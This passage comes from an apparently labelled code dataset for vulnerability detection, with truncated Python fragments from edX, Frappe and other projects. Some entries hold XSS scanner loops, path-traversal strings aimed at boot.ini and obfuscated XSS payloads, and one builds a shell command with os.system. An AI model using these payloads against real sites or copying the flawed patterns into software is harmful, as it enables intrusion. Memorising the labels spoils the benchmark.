bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck) print(\"[*]Test was finished at", "label": 0}, {"snippet_id": 19632, "code": ".cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz", "label": 0}, {"snippet_id": 38460, "code": " frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model", "label": 0}, {"snippet_id": 19697, "code": " as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils", "label": 0}, {"snippet_id": 32148, "code": " get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id=tables.Column(", "label": 1}, {"snippet_id": 54771, "code": "/' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def form_valid(self, form): a=form", "label": 0}, {"snippet_id": 48735, "code": " +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") if request.GET.get(\"id\"): aid: ArticleRequested=ArticleRequested.objects.get(id", "label": 0}, {"snippet_id": 50759, "code": " Screenreader mode. -send_prompt(bool): Send a prompt with parsed html \"\"\" if args: args=list(args) text=args[0] if text is None: return else: return flags=self.protocol_flags text=utils.to_str(text, force_string", "label": 0}, {"snippet_id": 34527, "code": "{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself", "label": 0}, {"snippet_id": 26726, "code": "'%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini", "label": 0}, {"snippet_id": 52375, "code": "=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']['workflow']", "label": 0}, {"snippet_id": 6263, "code": "/log' maybe. \"\"\" res=self.config.get(self.section, 'syslog_socket') if not res: res=None return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean", "label": 0}, {"snippet_id": 47176, "code": " menu from mock import patch from sqlalchemy.exc import SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"\"\"Test flask-admin", "label": 0}, {"snippet_id": 28246, "code": "\taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t", "label": 0}, {"snippet_id": 54254, "code": ".grid(row=9) Label(main, text=\"\",background='light sky blue').grid(row=10) ua=[\"\"] ua+=bane.ua li=bane.read_file('xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global", "label": 1}, {"snippet_id": 10259, "code": ")) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self)", "label": 0}, {"snippet_id": 804, "code": "=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body", "label": 1}, {"snippet_id": 41866, "code": ".get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0", "label": 0}, {"snippet_id": 20079, "code": " in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self", "label": 0}, {"snippet_id": 16661, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\")", "label": 0}, {"snippet_id": 24662, "code": "={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not", "label": 0}, {"snippet_id": 4288, "code": "\"generate XSS payload\"\"\" def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def", "label": 0}, {"snippet_id": 51346, "code": ".register(UrlList) class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'account',) search_fields=('name', 'account__name') list_filter=['account'][::-1] fields=('name', ", "label": 0}, {"snippet_id": 21304, "code": "[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/", "label": 1}, {"snippet_id": 35272, "code": " missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df", "label": 0}, {"snippet_id": 40833, "code": "\"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", ", "label": 0}, {"snippet_id": 1018, "code": ".items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse", "label": 1}, {"snippet_id": 48580, "code": " sr: SubReservation=None if srid==0: sr=SubReservation() else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes=request.POST[\"notes\"] else: sr.notes=\" \" sr.primary_reservation", "label": 1}, {"snippet_id": 40614, "code": " hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide", "label": 0}, {"snippet_id": 7704, "code": "+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name", "label": 1}, {"snippet_id": 17166, "code": "/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r", "label": 0}, {"snippet_id": 51394, "code": " this file, see https://docs.djangoproject.com/en/2.1/topics/settings/ For the full list of settings and their values, see https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime", "label": 0}, {"snippet_id": 47251, "code": "'title': 'test'}, id_=rec_uuid) db.session.commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for('recordmetadata.delete_view') detail_view_url", "label": 1}, {"snippet_id": 19561, "code": "'t duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop)", "label": 0}, {"snippet_id": 14004, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url", "label": 0}, {"snippet_id": 16888, "code": "]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 6586, "code": " value=self.config.get(self.section, 'content_packages') res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this.partition(':') res.append((name, path)) self._parsed_content_packages", "label": 0}, {"snippet_id": 7631, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 21276, "code": "*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 1}, {"snippet_id": 36969, "code": "=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): ", "label": 0}, {"snippet_id": 20281, "code": "\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If", "label": 0}, {"snippet_id": 43363, "code": " in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue", "label": 0}, {"snippet_id": 13485, "code": "', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),", "label": 0}, {"snippet_id": 18701, "code": "/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade", "label": 0}, {"snippet_id": 1175, "code": " app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5", "label": 0}, {"snippet_id": 43790, "code": "\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\"", "label": 0}, {"snippet_id": 32620, "code": "(full_path, 'image/jpeg') elif os.path.isdir(full_path): self._DoDirListing(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions", "label": 0}, {"snippet_id": 23747, "code": "' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super", "label": 0}, {"snippet_id": 5999, "code": " version=version, description=\"eduID SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML', author='Fredrik Thulin', author_email='fredrik@thulin.net', license='BSD', packages", "label": 0}, {"snippet_id": 18052, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED", "label": 0}, {"snippet_id": 42460, "code": "\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself", "label": 0}, {"snippet_id": 48079, "code": ".path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path): os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path) with open(high_res_file_name, 'wb+') as destination: for chunk in file.chunks", "label": 0}, {"snippet_id": 47310, "code": " follow_redirects=True) assert res.status_code==200 res=client.get(detail_view_url) assert res.status_code==200 assert '<pre>null</pre>' in res.get_data(as_text=True) res=client.post( delete_view_url, data={'id'", "label": 0}, {"snippet_id": 1095, "code": " xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result", "label": 0}, {"snippet_id": 13452, "code": ": urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern", "label": 0}, {"snippet_id": 45091, "code": " raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request", "label": 0}, {"snippet_id": 29827, "code": " not None and serv is not None: \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"ls -1t \"+cert_path+\" |grep pem\"] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert", "label": 0}, {"snippet_id": 48075, "code": "\", \"_\")) if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path): os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path) with open(high_res_file_name, 'wb+') as destination: for chunk", "label": 0}, {"snippet_id": 34632, "code": "]=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif", "label": 0}, {"snippet_id": 52585, "code": " parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',", "label": 0}, {"snippet_id": 19214, "code": ".shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name))", "label": 0}, {"snippet_id": 17516, "code": "=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'", "label": 0}, {"snippet_id": 36682, "code": " posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): ", "label": 0}, {"snippet_id": 10033, "code": "'{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir", "label": 0}, {"snippet_id": 49454, "code": " def get_title(self): if isinstance(self.model_field, SmartListFilter): return self.model_field.title return super(SmartFilter, self).get_title() def get_values(self): values=[] if isinstance(self.model_field", "label": 0}, {"snippet_id": 1441, "code": " return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html", "label": 0}, {"snippet_id": 35352, "code": "\t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname", "label": 0}, {"snippet_id": 44659, "code": "[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response[", "label": 0}, {"snippet_id": 11194, "code": " returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store),", "label": 0}, {"snippet_id": 34940, "code": " if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self)", "label": 0}, {"snippet_id": 48715, "code": " if \"srid\" in request.GET: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\\ '&srid=' +str(int(request.GET['srid']))) else: response=HttpResponseRedirect(\"/admin", "label": 0}, {"snippet_id": 51415, "code": " datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path.dirname(__file__)) SECRET_KEY", "label": 0}, {"snippet_id": 32109, "code": "\"identity\", \"identity:delete_mapping\"),) def delete(self, request, obj_id): api.keystone.mapping_delete(request, obj_id) class MappingFilterAction(tables.FilterAction): def filter(self, table, mappings", "label": 0}, {"snippet_id": 41997, "code": " isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif", "label": 0}, {"snippet_id": 34017, "code": "\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image", "label": 0}, {"snippet_id": 14166, "code": " settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 52131, "code": " LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json", "label": 1}, {"snippet_id": 7853, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 28201, "code": " \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config", "label": 0}, {"snippet_id": 54033, "code": " class sc(threading.Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"))) crl=[target.get()", "label": 0}, {"snippet_id": 42313, "code": "=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children", "label": 0}, {"snippet_id": 34081, "code": ".db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"", "label": 0}, {"snippet_id": 21445, "code": "]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 26223, "code": ": raise ValidationError(_('You need to provide a company name.')) if not data.get('is_business') and not data.get('name_parts'): raise ValidationError(_('You need to provide your name.')) if 'vat_id' in", "label": 0}, {"snippet_id": 15762, "code": ": return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self", "label": 0}, {"snippet_id": 23950, "code": " test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy", "label": 0}, {"snippet_id": 20784, "code": "[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,", "label": 0}, {"snippet_id": 23770, "code": " self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name", "label": 0}, {"snippet_id": 21726, "code": " name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', ", "label": 0}, {"snippet_id": 51372, "code": "', 'internal_filename', 'message', 'user', 'upload_date', 'filesize') search_fields=('internal_filename', 'orginal_filename', 'message') list_filter=['message', 'upload_date', 'user'][::-1] fields=('original_filename", "label": 1}, {"snippet_id": 20570, "code": "'--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains", "label": 0}, {"snippet_id": 31962, "code": "'ldap_server') \tport=sql.get_setting('ldap_port') \tuser=sql.get_setting('ldap_user') \tpassword=sql.get_setting('ldap_password') \tldap_base=sql.get_setting('ldap_base') \tdomain=sql.get_setting('ldap_domain", "label": 0}, {"snippet_id": 45722, "code": "='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle", "label": 0}, {"snippet_id": 39058, "code": "\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t", "label": 0}, {"snippet_id": 27866, "code": "\"\" exception=sys.exc_info()[1] values={'message': exception.message, 'traceDump': traceback.format_exc()} logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ", "label": 0}, {"snippet_id": 36594, "code": " from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): ", "label": 1}, {"snippet_id": 48528, "code": " default_foreward_url: str): \"\"\" This function is used to alter the reservation beeing build inside a cookie. This function automatically crafts the required response. \"\"\" js_string: str=\"\" r: GroupReservation=None u", "label": 0}, {"snippet_id": 24387, "code": " processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super", "label": 0}, {"snippet_id": 11620, "code": ", 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views", "label": 0}, {"snippet_id": 14713, "code": ")) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name", "label": 0}, {"snippet_id": 22198, "code": " 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$", "label": 0}, {"snippet_id": 44788, "code": "() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',{}) if script_path", "label": 0}, {"snippet_id": 28080, "code": "(base_handler.Handler): \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" try: auth.revoke_session_cookie", "label": 0}, {"snippet_id": 39534, "code": ".meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname", "label": 0}, {"snippet_id": 43391, "code": "\"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t", "label": 0}, {"snippet_id": 12027, "code": "[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r", "label": 0}, {"snippet_id": 43092, "code": "(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d", "label": 0}, {"snippet_id": 359, "code": " is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging", "label": 1}, {"snippet_id": 8526, "code": "', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$", "label": 0}, {"snippet_id": 29104, "code": "\tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" \"+enable] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error", "label": 0}, {"snippet_id": 2740, "code": "\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F", "label": 0}, {"snippet_id": 19897, "code": "=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss',", "label": 1}, {"snippet_id": 10331, "code": " process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color ", "label": 0}, {"snippet_id": 49417, "code": " return False class SmartFilter(TitleFromModelFieldMixin, object): def __init__(self, model, field, query_params, object_list): self.model=model if isinstance(field, SmartListFilter): self.field_name=field", "label": 0}, {"snippet_id": 49593, "code": " or[] self.list_search=list_search or[] self.search_query_value=self.query_params.get(search_query_param, '') self.search_query_param=search_query_param self.ordering_query_value=self.query_params.get(ordering_query_param", "label": 0}, {"snippet_id": 14787, "code": "'', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with", "label": 1}, {"snippet_id": 23642, "code": " bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support", "label": 0}, {"snippet_id": 44826, "code": " * 1024 ** 2) if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables", "label": 0}, {"snippet_id": 32027, "code": ".translation import ugettext_lazy as _ from django.utils.translation import ungettext_lazy from horizon import tables from openstack_dashboard import api class CreateMappingLink(tables.LinkAction): name", "label": 0}, {"snippet_id": 5650, "code": "=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad", "label": 0}, 